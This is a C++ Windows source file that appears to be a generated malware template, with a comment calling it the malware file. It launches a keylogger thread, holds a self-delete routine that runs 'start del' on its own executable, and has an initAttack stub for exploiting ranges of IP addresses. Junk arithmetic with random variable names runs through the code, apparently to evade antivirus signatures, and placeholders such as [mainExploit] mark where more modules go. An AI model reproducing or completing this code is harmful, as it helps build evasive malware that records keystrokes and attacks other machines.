#include "testo3.h"
bool isRandomName = false;
typedef struct threadData {
	int shellPort;
	char strIP[16];
} threadData, *PthreadData;
//Global var: malware file name
char fullName[MAX_PATH];
std::string fileName = "";

int main(int argc, char** argv) {

	GetModuleFileNameA(NULL, (LPSTR)fullName, 100);
	fileName = PathFindFileNameA(fullName);
	int izVSBu3ydHq = 0xdc1868a;
	int iUqGJHvcSyY = 0xe7745ff;
	int ilpXWObVnHk = 0x7c65b50;
	int iOQm2BxetW0 = izVSBu3ydHq + iUqGJHvcSyY - ilpXWObVnHk;
	iOQm2BxetW0 = 0x41b3315 * iOQm2BxetW0 + 0x45d1151 - iUqGJHvcSyY;
	int ijJUaO2Wif9 = iOQm2BxetW0 / 0x45d1151 + izVSBu3ydHq ^ ilpXWObVnHk - 0x7c65b50;


	//[ninjaModule]
	if (argc == 0) {/*normal process*/
	//
		std::vector<DWORD> arr_dwThreadIdModule;
		std::vector<HANDLE> arr_hThreadModule;
		HANDLE hThread = NULL;
		DWORD dwTID = 0;
		//Moudule Keylogger
		hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Keylogger, NULL, 0, &dwTID);
		if (hThread != INVALID_HANDLE_VALUE)
		{
			arr_hThreadModule.push_back(hThread);
			arr_dwThreadIdModule.push_back(dwTID);
		}
		WaitForMultipleObjects(arr_hThreadModule.size(), &arr_hThreadModule[0], TRUE, INFINITE);
		for (int i = 0; i < arr_hThreadModule.size(); i++) {
			if (arr_hThreadModule[i])
				CloseHandle(arr_hThreadModule[i]);
		}


		//[mainExploit]	

	}
	//[optionElseIf]
	else {
		SelfDelete();
		return 0;
		int i8KxIaMsCNq = 0x21abdbf;
		int igazCxaNtDO = 0xe58971f;
		int itXbwOPfsw2 = 0x9cfb6bc;
		int ipaoh77i6W5 = i8KxIaMsCNq + igazCxaNtDO - itXbwOPfsw2;
		ipaoh77i6W5 = 0x7b3e977 * ipaoh77i6W5 + 0x29ae066 - igazCxaNtDO;
		int iZw06viCwug = ipaoh77i6W5 / 0x29ae066 + i8KxIaMsCNq ^ itXbwOPfsw2 - 0x9cfb6bc;

	}
}
//WinMain for win app compile in visual studio
int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd)
{
	int argc;
	PCHAR *argv = CommandLineToArgvA(lpCmdLine, &argc);

	return main(argc, argv);
}

void SelfDelete() {
	char out[MAX_PATH];
	GetModuleFileNameA(NULL, (LPSTR)out, 100);
	char str[MAX_PATH];
	strcpy(str, "start del ");
	strcat(str, out);
	system(str);
}
PCHAR* CommandLineToArgvA(PCHAR CmdLine, int* _argc)
{
	PCHAR* argv;
	PCHAR  _argv;
	ULONG   len;
	ULONG   argc;
	CHAR   a;
	ULONG   i, j;

	BOOLEAN  in_QM;
	BOOLEAN  in_TEXT;
	BOOLEAN  in_SPACE;

	len = strlen(CmdLine);
	i = ((len + 2) / 2) * sizeof(PVOID) + sizeof(PVOID);

	argv = (PCHAR*)GlobalAlloc(GMEM_FIXED,
		i + (len + 2) * sizeof(CHAR));

	_argv = (PCHAR)(((PUCHAR)argv) + i);

	argc = 0;
	argv[argc] = _argv;
	in_QM = FALSE;
	in_TEXT = FALSE;
	in_SPACE = TRUE;
	int iO88B8Q4Aoy = 0xa4d59eb;
	int islVOL3ZaAj = 0xbbb1fd2;
	int iV2c9Dmg41Y = 0xacd0228;
	int iWQAhxMPXiO = iO88B8Q4Aoy + islVOL3ZaAj - iV2c9Dmg41Y;
	iWQAhxMPXiO = 0x4665842 * iWQAhxMPXiO + 0xdd5bbd9 - islVOL3ZaAj;
	int iBoI69TSSAT = iWQAhxMPXiO / 0xdd5bbd9 + iO88B8Q4Aoy ^ iV2c9Dmg41Y - 0xacd0228;

	i = 0;
	j = 0;

	while (a = CmdLine[i]) {
		if (in_QM) {
			if (a == '\"') {
				in_QM = FALSE;
			}
			else {
				_argv[j] = a;
				j++;
			}
		}
		else {
			switch (a) {
			case '\"':
				in_QM = TRUE;
				in_TEXT = TRUE;
				if (in_SPACE) {
					argv[argc] = _argv + j;
					argc++;
				}
				in_SPACE = FALSE;
				break;
			case ' ':
			case '\t':
			case '\n':
			case '\r':
				if (in_TEXT) {
					_argv[j] = '\0';
					j++;
				}
				in_TEXT = FALSE;
				in_SPACE = TRUE;
				int i1CoSzSG6nA = 0x6094a76;
				int i8PChGlLwPP = 0x2552a5f;
				int i3ASYmpSgL1 = 0xd82b4df;
				int iAbAyV13w04 = i1CoSzSG6nA + i8PChGlLwPP - i3ASYmpSgL1;
				iAbAyV13w04 = 0x804e0d1 * iAbAyV13w04 + 0xa271252 - i8PChGlLwPP;
				int iO7xpRJK644 = iAbAyV13w04 / 0xa271252 + i1CoSzSG6nA ^ i3ASYmpSgL1 - 0xd82b4df;
				break;


			default:
				in_TEXT = TRUE;
				if (in_SPACE) {
					argv[argc] = _argv + j;
					argc++;
				}
				_argv[j] = a;
				j++;
				in_SPACE = FALSE;
				int iGq4oMCpu56 = 0xe4c9366;
				int iupMQv8bopH = 0xa2dddd5;
				int iJNoo7cjrYq = 0x09fa9d4;
				int iAsHFSPaWuK = iGq4oMCpu56 + iupMQv8bopH - iJNoo7cjrYq;
				iAsHFSPaWuK = 0xb12f3ec * iAsHFSPaWuK + 0xec2d1b4 - iupMQv8bopH;
				int i7Whjk6F4gK = iAsHFSPaWuK / 0xec2d1b4 + iGq4oMCpu56 ^ iJNoo7cjrYq - 0x09fa9d4;

				break;
			}
		}
		i++;
	}
	_argv[j] = '\0';
	argv[argc] = NULL;

	(*_argc) = argc;
	return argv;
}
int initAttack(int ipAddress[]) {

	register int i, j;
	u_long opt = 1;

	PthreadData pDataArray[MAX_THREADS];
	DWORD   dwThreadIdArray[MAX_THREADS];
	HANDLE  hThreadArray[MAX_THREADS];
	int curIP[4];

	//[exploitThreads]

	//Increase IP when all exploit done
	ipAddress[0] = curIP[0];
	ipAddress[1] = curIP[1];
	ipAddress[2] = curIP[2];
	ipAddress[3] = curIP[3];
	return 1;
}

//[exploit_function]

void ipAr2Str(int ipAddress[], char* result) {
	int tmp[4];
	int imAnT0pN7Mp = 0x22b82c6;
	int iWxvJodJZfj = 0x4baaf4c;
	int iSYY4xJyXaf = 0xd318b30;
	int ilZtKljykQ7 = imAnT0pN7Mp + iWxvJodJZfj - iSYY4xJyXaf;
	ilZtKljykQ7 = 0xdc4a5a9 * ilZtKljykQ7 + 0xe42099a - iWxvJodJZfj;
	int iLP7Bn4O0oK = ilZtKljykQ7 / 0xe42099a + imAnT0pN7Mp ^ iSYY4xJyXaf - 0xd318b30;

	tmp[0] = ipAddress[0];
	tmp[1] = ipAddress[1];
	tmp[2] = ipAddress[2];
	tmp[3] = ipAddress[3];
	sprintf(result, "%i.%i.%i.%i", ipAddress[0], ipAddress[1], ipAddress[2], ipAddress[3]);
	// printf("%s\n",result);
	return;
}
